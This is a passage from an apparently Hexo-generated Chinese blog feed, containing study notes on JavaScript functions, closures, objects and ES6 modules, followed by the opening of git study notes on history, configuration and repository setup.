<h5 id="2）函数表达式-函数变量-定义"><a href="#2）函数表达式-函数变量-定义" class="headerlink" title="2）函数表达式(函数变量)定义"></a>2）函数表达式(函数变量)定义</h5><p>将匿名函数赋给一个变量，该变量可以跟函数一样使用，其数据类型为函数类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> vB = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a*b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">vB</span>(<span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<p>在《JavaScript权威指南》中说:</p>
<blockquote>
<p>以表达式定义的函数只适用于它作为一个大的表达式的一部分。</p>
</blockquote>
<p>其实，我觉得表达式定义形式也可以用于一般函数。感觉两者没什么太大区别，可能也是我不了解js的内部实现。</p>
<h4 id="2-匿名函数"><a href="#2-匿名函数" class="headerlink" title="2.匿名函数"></a>2.匿名函数</h4><p>不带函数名的函数，即为匿名函数，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this is an anonymous function&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可单单定义一个匿名函数是无法调用的，因为它没有名字。但，我们可以通过将匿名函数赋给变量(该变量成为函数类型变量)，或函数自调用的方式，来调用匿名函数。</p>
<p><code>ES6</code>新增用<strong>箭头函数</strong>来表示匿名函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES6 新增箭头函数来表示匿名函数，一个参数时可以省略圆括号，一条语句可以省略花括号</span></span><br><span class="line"><span class="keyword">var</span> <span class="title function_">vB</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;箭头函数 || a-b is &#x27;</span> + (a-b));</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">vB</span>(<span class="number">6</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<h4 id="3-函数自调用"><a href="#3-函数自调用" class="headerlink" title="3.函数自调用"></a>3.函数自调用</h4><p>其形式为 <code>(...匿名函数定义...)(...参数...);</code> 。作用是在函数定义后立即调用该函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;函数自调用 || a-b is &#x27;</span> + (a-b));</span><br><span class="line">&#125;)(<span class="number">6</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;箭头函数 || a-b is &#x27;</span> + (a-b));</span><br><span class="line">&#125;)(<span class="number">6</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">函数自调用 || a-b is 4</span><br><span class="line">箭头函数 || a-b is 4</span><br></pre></td></tr></table></figure>

<h4 id="4-函数作为值"><a href="#4-函数作为值" class="headerlink" title="4.函数作为值"></a>4.函数作为值</h4><p>在js中，函数也是变量，那么函数就可以当作一个变量来进行传递。</p>
<h5 id="1）函数作为返回值（函数闭包）"><a href="#1）函数作为返回值（函数闭包）" class="headerlink" title="1）函数作为返回值（函数闭包）"></a>1）函数作为返回值（函数闭包）</h5><p>函数返回一个子函数(嵌套函数)，那接受这个返回值的变量即是函数类型变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fa</span> (first) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">second</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> first += second;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> son = <span class="title function_">fa</span>(<span class="number">0</span>);  <span class="comment">// son变量接受一个返回函数</span></span><br><span class="line"><span class="comment">/*相当于</span></span><br><span class="line"><span class="comment">var son = function (second) &#123;</span></span><br><span class="line"><span class="comment">  return first += second</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">只是这样定义时，不能使用函数fa()的局部变量first</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">son</span>(<span class="number">1</span>));  <span class="comment">// 输出 1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">son</span>(<span class="number">1</span>));  <span class="comment">// 输出 2</span></span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fa</span> (first) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">second</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> first += second;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> son = <span class="title function_">fa</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">son</span>(<span class="number">1</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">son</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 直接将fa函数写成自调用的匿名函数，自调用后返回一个函数给son变量</span></span><br><span class="line"><span class="keyword">var</span> son = ((<span class="function">(<span class="params">first</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">second</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> first += second;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)(<span class="number">0</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">son</span>(<span class="number">1</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">son</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>从第一个代码示例中，我们可以发现：返回一个函数(fa)的内部函数(son)时，我们可以通过这个返回的函数(son)来使用外函数(fa)中的局部变量。而且在不断调用内部函数(son)的过程中，外函数(fa)并没有被销毁(出栈)。由于这种机制，我们就可以让<strong>函数拥有私有变量，不能被全局使用</strong>，但又可以一直保持值不被销毁。而这就是<strong>闭包</strong>。</p>
<p>代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数闭包。使函数可以拥有私有变量(外部不可访问，同时也不会因为函数调用而刷新)</span></span><br><span class="line"><span class="keyword">var</span> add = (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;<span class="keyword">return</span> counter += <span class="number">1</span>;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="title function_">add</span>();  <span class="comment">// add()实际调用的是上述匿名主函数中返回的匿名子函数</span></span><br><span class="line"><span class="title function_">add</span>();</span><br><span class="line"><span class="title function_">add</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;函数闭包 || &#x27;</span>, <span class="title function_">add</span>());</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">函数闭包 ||  4</span><br></pre></td></tr></table></figure>

<h5 id="2）函数作为参数（多态性-x2F-Lambda表达式）"><a href="#2）函数作为参数（多态性-x2F-Lambda表达式）" class="headerlink" title="2）函数作为参数（多态性&#x2F;Lambda表达式）"></a>2）函数作为参数（多态性&#x2F;Lambda表达式）</h5><p>将一个自定义函数作为参数传入另一个函数中，这个传入函数可以根据不同情况自行定义，从而让被传入函数实现不同效果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数作为参数。使多态性得以体现</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">appendDiv</span> (callback) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">        div.<span class="property">innerHTML</span> = i;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div);</span><br><span class="line">        <span class="comment">// 如果传入的参数是一个函数类型的变量</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> callback == <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(div);    <span class="comment">// 将该形参作为函数变量使用</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(callback);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将一个自定义的匿名函数作为参数传入appendDiv()函数</span></span><br><span class="line"><span class="title function_">appendDiv</span>(<span class="function">(<span class="params">node</span>) =&gt;</span> &#123;</span><br><span class="line">    node.<span class="property">style</span>.<span class="property">display</span>=<span class="string">&#x27;block&#x27;</span>; <span class="comment">// 让该元素以块元素展示(独占一行)</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="title function_">appendDiv</span>(<span class="function">(<span class="params">node</span>) =&gt;</span> &#123;</span><br><span class="line">    node.<span class="property">style</span>.<span class="property">display</span>=<span class="string">&#x27;inline&#x27;</span>;  <span class="comment">// 让该元素以行内元素展示</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>显示结果：<br><img src="/javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/%E5%87%BD%E6%95%B0%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0.png" alt="函数作为参数"></p>
<p>函数作为参数传入另一个函数的方式，常用于将自定义的回调函数传入接口函数中。但，在传入自定义参数到接口函数的这种场景中，常常是将回调函数作为对象中的一个方法传入的。</p>
<p>如微信小程序开发中常用的网络请求接口函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">wx.<span class="title function_">request</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: wx.<span class="title function_">getStorageSync</span>(<span class="string">&#x27;requestUrl&#x27;</span>) + <span class="string">&#x27;/small/config&#x27;</span>,</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">header</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">success</span>: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get config: &#x27;</span>, res.<span class="property">data</span>.<span class="property">WeCosUrl</span>)</span><br><span class="line">    wx.<span class="title function_">setStorageSync</span>(<span class="string">&#x27;wecosUrl&#x27;</span>, res.<span class="property">data</span>.<span class="property">WeCosUrl</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>wx.request()是微信提供的用于网络请求的接口函数，其参数是一个对象。对象中的success方法，是wx.request()函数执行访问成功后调用的函数，由用户自定义。而这就是一种多态性。</p>
<h3 id="六、对象"><a href="#六、对象" class="headerlink" title="六、对象"></a>六、<strong>对象</strong></h3><h4 id="1-Js-中的对象"><a href="#1-Js-中的对象" class="headerlink" title="1. Js 中的对象"></a>1. Js 中的对象</h4><p>在js中，大部分事物都是一个对象。引用《JavaScript权威指南》中的话说：</p>
<blockquote>
<p>除了字符串、数字、true、false、null和undefined之外，JavaScript中的值都是对象。尽管字符串、数组和布尔值不是对象，但它们的行为和不可变对象非常类似。</p>
</blockquote>
<p>字符串有对象的部分特性，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> message=<span class="string">&#x27;Hello World!&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(message.<span class="property">length</span>);  <span class="comment">// 获取字符串的长度属性</span></span><br></pre></td></tr></table></figure>

<p>但，字符串“对象”的属性是不可修改的，如：修改message.length的大小是无效的。同时，字符串还有很多常用的自带方法，如：内容匹配match()、内容替换replace()、转换大小写toUpperCase()&#x2F;toLowerCase()等等。</p>
<h4 id="2-对象创建"><a href="#2-对象创建" class="headerlink" title="2. 对象创建"></a>2. 对象创建</h4><p>js中，对象用<code>&#123;&#125;</code>将属性和方法包裹起来。每个属性和方法都有唯一的名字，而且名字和值之间是通过<code>:</code>一一映射的。如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;tomcat&#x27;</span>,</span><br><span class="line">  <span class="attr">getName</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">getName</span>()); <span class="comment">// 输出 tomcat</span></span><br></pre></td></tr></table></figure>

<p><strong>this的注意点</strong>：</p>
<p>this关键字指向的是调用该函数的对象。如果不使用<code>this.name</code>，可能会返回全局中的name变量。如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;tomcat&#x27;</span>,</span><br><span class="line">  <span class="attr">getName</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ES6新特性：方法名简写</span></span><br><span class="line">  <span class="title function_">setName</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;tom&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">getName</span>()); <span class="comment">// 输出 tom</span></span><br></pre></td></tr></table></figure>

<hr>
<p><strong>注意：</strong></p>
<p>另外，<strong>箭头函数</strong>虽然是匿名函数的一种简写，但实际上，箭头函数和匿名函数有个明显的区别：<strong>this指针的指向</strong>。匿名函数中this指向调用者对象，而箭头函数中的this指向上一层调用者对象。如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;tom&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;tomcat&#x27;</span>,</span><br><span class="line">  <span class="attr">getName</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);  <span class="comment">// 输出 window对象</span></span><br><span class="line">    <span class="comment">// 由于箭头函数，this指针指向上一层对象，即全局对象，因此这里的this.name是全局中的name变量</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">getName</span>()); <span class="comment">// 输出 tom</span></span><br></pre></td></tr></table></figure>

<p>所以，在对象的方法定义中，<strong>不建议使用箭头函数</strong>。</p>
<hr>
<p>对象还可以通过<strong>new + 构造函数</strong>的方法来创建，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title class_">Object</span>(); <span class="comment">// Object()是Object这个js“原型”对象的构造函数。返回一个空对象</span></span><br></pre></td></tr></table></figure>

<h4 id="3-Js-对象属性和方法的动态性"><a href="#3-Js-对象属性和方法的动态性" class="headerlink" title="3. Js 对象属性和方法的动态性"></a>3. Js 对象属性和方法的动态性</h4><p>可以动态增加与删除对象中的属性和方法，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态增加属性 方法</span></span><br><span class="line"><span class="keyword">var</span> book = &#123;&#125;;</span><br><span class="line"><span class="comment">// var book = new Object();</span></span><br><span class="line">book.<span class="property">author</span> = <span class="string">&#x27;es6&#x27;</span>;</span><br><span class="line">book.<span class="property">title</span> = <span class="string">&#x27;JavaScript&#x27;</span>;</span><br><span class="line">book.<span class="property">changeTitle</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">title</span> = <span class="string">&#x27;python&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">title</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(book.<span class="property">author</span>, book.<span class="property">title</span>, book.<span class="title function_">changeTitle</span>()); <span class="comment">// 输出 es6 JavaScript python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除属性、方法</span></span><br><span class="line"><span class="keyword">delete</span> book.<span class="property">author</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(book.<span class="property">author</span>); <span class="comment">// 输出 undefined</span></span><br></pre></td></tr></table></figure>

<h4 id="4-Js-对象的引用与赋值"><a href="#4-Js-对象的引用与赋值" class="headerlink" title="4. Js 对象的引用与赋值"></a>4. Js 对象的引用与赋值</h4><p>js中对象值是引用类型，相当于指针。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对象的引用与赋值</span></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">　　a : <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj2 = obj1;</span><br><span class="line">obj2.<span class="property">a</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj1.<span class="property">a</span>);  <span class="comment">// 输出2</span></span><br></pre></td></tr></table></figure>

<p><code>var obj2 = obj1;</code>相当于把<code>obj1</code>的指针赋给<code>obj2</code>，所以<code>obj1</code>和<code>obj2</code>指向同一对象的数据。</p>
<p>同时，若函数参数为对象，并在函数中修改对象中数据，那也会影响到函数外的对象。</p>
<p>那js应该如何正确的进行对象赋值呢，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对象间赋值的正确方法</span></span><br><span class="line"><span class="keyword">var</span> obj3 = &#123;</span><br><span class="line">  <span class="attr">a</span>:<span class="number">1</span>,</span><br><span class="line">  <span class="attr">b</span>:<span class="number">2</span>,</span><br><span class="line">  <span class="attr">c</span>:<span class="number">3</span>,</span><br><span class="line">  <span class="attr">d</span>:[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> jsonStr = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj3);</span><br><span class="line"><span class="keyword">var</span> obj4 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonStr);</span><br><span class="line">obj4[<span class="string">&quot;e&quot;</span>] = <span class="number">4</span>;</span><br><span class="line">obj4[<span class="string">&quot;d&quot;</span>][<span class="number">0</span>] = <span class="number">11</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj3);  <span class="comment">//Object &#123;a: 1, b: 2, c: 3, d: [0,1,2,3]&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj4);  <span class="comment">//Object &#123;a: 1, b: 2, c: 3, d: [11,1,2,3], e: 4&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="七、模块的导入导出"><a href="#七、模块的导入导出" class="headerlink" title="七、模块的导入导出"></a>七、模块的导入导出</h3><p><code>ES6</code>新特性。解决不同<code>Js</code>文件之间，如何进行变量共享的问题。</p>
<h4 id="1-export"><a href="#1-export" class="headerlink" title="1. export"></a>1. export</h4><p><code>export</code>声明导出的变量，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//--------exportTest.js----------</span></span><br><span class="line"><span class="keyword">let</span> myName = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> myAge = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">let</span> myfn = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;My name is&quot;</span> + myName + <span class="string">&quot;! I&#x27;m &#x27;&quot;</span> + myAge + <span class="string">&quot;years old.&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> myClass =  <span class="keyword">class</span> <span class="title class_">myClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> a = <span class="string">&quot;yeah!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> &#123; myName, myAge, myfn, myClass &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-import"><a href="#2-import" class="headerlink" title="2. import"></a>2. import</h4><p><code>import</code>从指定<code>js</code>文件导入变量，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//--------importTest.js----------</span></span><br><span class="line"><span class="keyword">import</span> &#123;myName, myAge, myfn, myClass&#125; <span class="keyword">from</span> <span class="string">&quot;./exportTest&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">myfn</span>());    <span class="comment">// My name is Tom! I&#x27;m 20 years old.</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(myAge);     <span class="comment">// 20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(myName);    <span class="comment">// Tom</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(myClass.<span class="property">a</span> );<span class="comment">// yeah!</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>可以用<code>as</code>关键字重新命名导入变量，如：<code>import import &#123; myName as name1 &#125; from &#39;xxx.js&#39;</code>。将导入的<code>myName</code>变量重命名为<code>name1</code>，在当前文件中使用。</p>
</li>
<li><p>导入变量可以使用但不能进行修改。</p>
</li>
</ul>
<h4 id="3-export-default"><a href="#3-export-default" class="headerlink" title="3. export default"></a>3. export default</h4><ul>
<li><p>在一个文件或模块中，<code>export</code> 可以有多个，<code>export default</code> 仅可以有一个。</p>
</li>
<li><p><code>export default</code> 中的 <code>default</code> 是对应的导出接口变量。</p>
</li>
<li><p>通过 <code>export</code> 方式导出，在导入时要加<code>&#123; &#125;</code>，<code>export default</code> 则不需要。</p>
</li>
<li><p><code>export default</code> 向外暴露的成员，可以使用<strong>任意变量</strong>来接收。</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//--------exportTest.js----------</span></span><br><span class="line"><span class="keyword">let</span> myName = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> myName</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//--------importTest.js----------</span></span><br><span class="line"><span class="keyword">import</span> name <span class="keyword">from</span> <span class="string">&quot;./exportTest&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name);    <span class="comment">// Tom</span></span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><p>《JavaScript 权威指南》</p>
</li>
<li><p><a href="http://www.runoob.com/w3cnote/es6-tutorial.html">ES6 教程-菜鸟教程</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>程序设计语言</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>git学习笔记</title>
    <url>/git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>git在团队协作中有重要作用，是有必要进行系统学习的一门工具。本篇是笔者学习git操作的备忘笔记，主要在linux上进行。</p>
<h2 id="1-git历史"><a href="#1-git历史" class="headerlink" title="1. git历史"></a>1. git历史</h2><blockquote>
<p>很多人都知道，Linus在1991年创建了开源的Linux，从此，Linux系统不断发展，已经成为最大的服务器系统软件了。<br>Linus虽然创建了Linux，但Linux的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为Linux编写代码，那Linux的代码是如何管理的呢？<br>事实是，在2002年以前，世界各地的志愿者把源代码文件通过diff的方式发给Linus，然后由Linus本人通过手工方式合并代码！<br>你也许会想，为什么Linus不把Linux代码放到版本控制系统里呢？不是有CVS、SVN这些免费的版本控制系统吗？因为Linus坚定地反对CVS和SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比CVS、SVN好用，但那是付费的，和Linux的开源精神不符。<br>不过，到了2002年，Linux系统已经发展了十年了，代码库之大让Linus很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是Linus选择了一个商业的版本控制系统BitKeeper，BitKeeper的东家BitMover公司出于人道主义精神，授权Linux社区免费使用这个版本控制系统。<br>安定团结的大好局面在2005年就被打破了，原因是Linux社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发Samba的Andrew试图破解BitKeeper的协议（这么干的其实也不只他一个），被BitMover公司发现了（监控工作做得不错！），于是BitMover公司怒了，要收回Linux社区的免费使用权。<br>Linus可以向BitMover公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是这样的：<br>Linus花了两周时间自己用C写了一个分布式版本控制系统，这就是Git！一个月之内，Linux系统的源码已经由Git管理了！牛是怎么定义的呢？大家可以体会一下。<br>Git迅速成为最流行的分布式版本控制系统，尤其是2008年，GitHub网站上线了，它为开源项目免费提供Git存储，无数开源项目开始迁移至GitHub，包括jQuery，PHP，Ruby等等。<br>历史就是这么偶然，如果不是当年BitMover公司威胁Linux社区，可能现在我们就没有免费而超级好用的Git了。</p>
</blockquote>
<span id="more"></span>

<h2 id="2-git三大区"><a href="#2-git三大区" class="headerlink" title="2. git三大区"></a>2. git三大区</h2><p><img src="/git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/git.jpg" alt="git三大区域"><br><img src="/git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/git2.png" alt="git三大区域-ProGit"></p>
<ul>
<li>工作区(The working tree)：即电脑中git仓库所在的目录，进行工作和修改的目录。</li>
<li>暂存区(The staging area)：暂时存放你的修改的区域。  <strong>通过<code>git add</code>命令将工作区改动的内容(包括修改的文件、新增的文件)添加到暂存区。</strong>  暂存区是你下次要提交的内容，”that stores information about what will go into your next commit”。</li>
<li>版本库(The Git directory)：是存放git仓库中各历史版本的区域，在仓库所在根目录的.git&#x2F;目录下。  当你执行commit提交时，git会将暂存区的内容复制到版本库中，并设为最新版本。  当执行clone从远程克隆仓库当本地时，会将那个远程仓库的版本库也克隆下来。  在版本库中，有一个<strong>HEAD指针</strong>，它指向当前分支(通常是master)的当前版本。</li>
</ul>
<h2 id="3-git配置"><a href="#3-git配置" class="headerlink" title="3. git配置"></a>3. git配置</h2><p><code>git config user.name &quot;yourname&quot;</code> 配置当前项目用户名字</p>
<p><code>git config user.email youremail</code> 配置当前项目用户邮箱</p>
<p><code>git config --global user.name &quot;yourname&quot;</code> 配置全局用户名字</p>
<p><code>git config --global user.email youremail</code> 配置全局用户邮箱</p>
<p><code>--global</code> 对当前用户，<code>--system</code> 对所有用户</p>
<p><code>git config --list</code> 查看已有的配置信息</p>
<p><code>vim ~/.gitconfig</code> 编辑当前用户的git配置文件，<code>vim /etc/gitconfig</code> 所有用户的git配置文件</p>
<p><code>vim .gitignore</code> 仓库根目录下的<code>.gitignore</code>文件中配置了git操作时的忽略文件</p>
<h2 id="4-git基础操作"><a href="#4-git基础操作" class="headerlink" title="4. git基础操作"></a>4. git基础操作</h2><h3 id="4-1-创建本地仓库"><a href="#4-1-创建本地仓库" class="headerlink" title="4.1. 创建本地仓库"></a>4.1. 创建本地仓库</h3><p><code>git init</code> 在当前文件夹创建一个可git管理的本地仓库</p>
